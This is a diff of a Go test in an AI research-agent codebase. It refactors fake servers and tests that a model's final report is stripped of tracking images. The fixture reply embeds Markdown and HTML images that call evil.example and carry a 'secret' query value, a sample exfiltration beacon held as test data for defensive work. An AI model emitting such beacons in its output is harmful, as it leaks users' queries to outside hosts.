@@ -5,8 +5,9 @@ import (
 	"strings"
 	"testing"
 
-	"github.com/rxbynerd/chiron/internal/researcher/fleet/model"
+	"github.com/rxbynerd/chiron/internal/researcher/fleet/model/modeltest"
 	"github.com/rxbynerd/chiron/internal/researcher/fleet/search"
+	"github.com/rxbynerd/chiron/internal/researcher/fleet/search/searchtest"
 	"github.com/rxbynerd/chiron/internal/types"
 )
 
@@ -45,10 +46,10 @@ func TestSanitiseAnswer(t *testing.T) {
 // image and raw HTML reaches the Finding as plain Markdown, so opening the
 // report cannot fire a beacon carrying the query.
 func TestRunWorkerFinalAnswerIsSanitised(t *testing.T) {
-	searchSrv := search.NewFakeServer([]search.Result{{Title: "A", URL: "https://a.example"}})
+	searchSrv := searchtest.NewFakeServer([]search.Result{{Title: "A", URL: "https://a.example"}})
 	defer searchSrv.Close()
-	modelSrv := model.NewFakeServer(
-		model.FakeReply{Content: `{"action":"search","query":"x"}`, FinishReason: "stop"},
+	modelSrv := modeltest.NewFakeServer(
+		modeltest.FakeReply{Content: `{"action":"search","query":"x"}`, FinishReason: "stop"},
 		finalReply("# Report\n\n![tracker](https://evil.example/b?q=secret)\n<img src=\"https://evil.example/i\">\nSee <https://a.example>.", "https://a.example"),
 	)
 	defer modelSrv.Close()
